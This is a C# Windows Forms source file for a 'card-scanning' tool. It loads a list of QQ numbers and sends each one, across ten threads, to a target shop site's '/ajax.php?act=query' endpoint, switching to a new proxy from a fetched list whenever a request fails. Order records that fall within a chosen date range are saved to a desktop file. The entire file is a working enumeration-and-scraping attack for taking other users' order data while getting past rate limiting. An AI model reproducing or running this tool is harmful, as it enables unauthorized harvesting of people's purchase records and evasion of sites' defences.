using System.Collections.Concurrent;
using System.Diagnostics;
using System.Net;
using System.Text;

namespace saoka_tools
{

    public partial class saoka : Form
    {
        private static string keyPath = "";
        private Task workerTask;
        private CancellationTokenSource cancellationTokenSource = new CancellationTokenSource();
        private SemaphoreSlim pauseSemaphore = new SemaphoreSlim(1, 1);  // 初始状态为非暂停
        private const int THREAD_COUNT = 10;
        private ConcurrentQueue<string> qqQueue;
        private static string gl_atime = "";
        private static string gl_btime = "";
        private static string[] proxyIPList;
        private static int nowIPList = 0;
        private static int MAX_RETRY_COUNT = 3; // 最大重试次数，防止无限循环
        public saoka()
        {
            InitializeComponent();
        }

        private void saoka_Load(object sender, EventArgs e)
        {
            addLog("扫卡脚本 构建版本: 23a02w(R)");
            addLog("请先导入弱口令合集再启动运行！");
        }

        private void addLog(string text)
        {
            string time = DateTime.Now.ToString();
            logTextBox.AppendText($"[{time}] {text}\r\n");
            logTextBox.ScrollToCaret();
        }


        private void button1_Click(object sender, EventArgs e)
        {
            // 创建一个 OpenFileDialog 对话框来让用户选择文件
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "Text files (*.txt)|*.txt|All files (*.*)|*.*"; // 仅筛选文本文件
            openFileDialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop); // 默认位置设置为桌面

            // 显示对话框并获取结果
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                // 获取文件路径
                string selectedFilePath = openFileDialog.FileName;
                if (string.IsNullOrEmpty(selectedFilePath))
                {
                    return; // 如果地址为空或用户放弃选择，直接返回
                }
                else
                {
                    keyPath = selectedFilePath; // 更新 keyPath 变量
                    button1.Enabled = false;
                    button2.Enabled = true;
                    label1.Text = "字典位置:" + keyPath;
                    addLog($"弱密码{keyPath}已记录位置,请勿移动或删除!");
                }
            }
        }

        private async void button2_Click(object sender, EventArgs e)
        {
            if (button2.Text == "开始")
            {
                if (string.IsNullOrEmpty(keyPath))
                {
                    MessageBox.Show("先导入弱口令合集后再启动!");
                    return;
                }

                gl_atime = textBox3.Text;
                gl_btime = textBox4.Text;

                // 获取代理IP列表
                proxyIPList = await GetProxyIPList();

                if (proxyIPList.Length < 1)
                {
                    MessageBox.Show("代理IP读取失败，任务无法启动!");
                    return;
                }
                else {
                    addLog($"已读取到{proxyIPList.Length}个IP代理IP.");
                }

                button2.Text = "正在启动中...";



                ToggleUIControls(false);

                cancellationTokenSource = new CancellationTokenSource();
                var lines = File.ReadAllLines(keyPath);
                qqQueue = new ConcurrentQueue<string>(lines);

                var tasks = Enumerable.Range(0, THREAD_COUNT)
                    .Select(_ => ProcessQQs()).ToList();

                await Task.WhenAll(tasks);

                FinishTask();
            }
            else if (button2.Text == "停止")
            {
                FinishTask();
                cancellationTokenSource.Cancel();
            }
        }

        private async Task<string[]> GetProxyIPList()
        {
            using (HttpClient client = new HttpClient())
            {
                try
                {
                    string content = await client.GetStringAsync(textBox2.Text);
                    return content.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.RemoveEmptyEntries);

                }
                catch
                {
                    return new string[0];
                }
            }
        }

        private async Task<string> GetNextProxyIP()
        {
            nowIPList++;
            var newip = proxyIPList[nowIPList];
            addLog($"代理IP地址已更改为:{newip}");
            return newip;
        }


        private async Task ProcessQQs()
        {
            string proxyIP = await GetNextProxyIP();



            var handler = CreateHttpClientHandler(proxyIP);
            string filePath = CreateOutputFilePath();

            using (HttpClient client = new HttpClient(handler))
            {
                while (qqQueue.TryDequeue(out string qq))
                {
                    if (cancellationTokenSource.Token.IsCancellationRequested) break;

                    var result = await QueryQQData(client, qq);
                    if (result != null)
                    {
                        lock (filePath)  // 当写入文件时确保线程安全
                        {
                            File.AppendAllText(filePath, result);
                        }
                        addLog($"QQ{qq}读取到数据,已储存。");
                    }
                }
            }
        }


        private void ToggleUIControls(bool enable)
        {
            // 根据任务的状态启用或禁用UI控件
            textBox1.Enabled = enable;
            textBox2.Enabled = enable;
            textBox3.Enabled = enable;
            textBox4.Enabled = enable;
            button1.Enabled = enable;

            if (enable)
            {
                button2.Text = "开始";
            }
            else
            {
                button2.Text = "停止";
            }
        }

        private string CreateOutputFilePath()
        {

            var desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            return Path.Combine(desktopPath, "saomiao_" + DateTimeOffset.UtcNow.ToUnixTimeSeconds() + ".txt");
        }

        private HttpClientHandler CreateHttpClientHandler(string proxyIP)
        {
            var handler = new HttpClientHandler();
            if (!string.IsNullOrWhiteSpace(proxyIP))
            {
                handler.Proxy = new WebProxy(proxyIP, false);
                handler.UseProxy = true;
            }
            return handler;
        }


        private async Task<string> QueryQQData(HttpClient client, string qq)
        {
            addLog($"线程已进入,开启线程数:{THREAD_COUNT}");

            var data = new Dictionary<string, string>
            {
                { "type", "0" },
                { "qq", qq.Trim() }
            };

            int retryCount = 0;

            while (retryCount < MAX_RETRY_COUNT)
            {
                try
                {
                    var response = await client.PostAsync(textBox1.Text + "/ajax.php?act=query", new FormUrlEncodedContent(data));

                    if (response.IsSuccessStatusCode)
                    {
                        var result = await response.Content.ReadAsStringAsync();
                        addLog($"[HTTP] -> {result}");
                        var jsonResult = Newtonsoft.Json.Linq.JObject.Parse(result);
                        var dataArray = jsonResult["data"] as Newtonsoft.Json.Linq.JArray;

                        if (dataArray != null && dataArray.Count > 0)
                        {
                            StringBuilder output = new StringBuilder();
                            output.AppendLine($"[{qq}]");

                            for (int i = 0; i < dataArray.Count; i++)
                            {
                                var dataItem = dataArray[i];

                                DateTime trytime = DateTime.Parse(dataItem["addtime"].ToString());

                                DateTime a_time = DateTime.Parse(gl_atime);
                                DateTime b_time = DateTime.Parse(gl_btime);

                                if (a_time < trytime && trytime < b_time)
                                {
                                    output.AppendLine($"({i + 1})");
                                    output.AppendLine($"id = {dataItem["id"]}");
                                    output.AppendLine($"tid = {dataItem["tid"]}");
                                    output.AppendLine($"name = {dataItem["name"]}");
                                    output.AppendLine();  // 空行
                                }
                            }

                            return output.ToString();
                        }
                    }
                    else
                    {
                        addLog($"[HTTPERROR] -> 访问错误,尝试第 {retryCount + 1} 次重试并更换代理...");
                        // 更换代理
                        var newProxyIP = await GetNextProxyIP();
                        client.DefaultRequestHeaders.ConnectionClose = true; // Close current connection before switching proxy
                        var handler = CreateHttpClientHandler(newProxyIP);
                        client = new HttpClient(handler); // 重新创建client以应用新的代理
                        retryCount++;
                    }
                }
                catch (Exception ex)
                {
                    addLog($"发生错误: {ex.Message}, 尝试第 {retryCount + 1} 次重试并更换代理...");
                    // 更换代理
                    var newProxyIP = await GetNextProxyIP();
                    client.DefaultRequestHeaders.ConnectionClose = true; // Close current connection before switching proxy
                    var handler = CreateHttpClientHandler(newProxyIP);
                    client = new HttpClient(handler); // 重新创建client以应用新的代理
                    retryCount++;
                }
            }

            return null;
        }


        private void FinishTask()
        {
            // 任务结束后的一些清理工作
            button2.Text = "开始";
            ToggleUIControls(true);
            addLog("任务已执行完毕！");
            MessageBox.Show("任务已执行完毕！");
        }

    }
}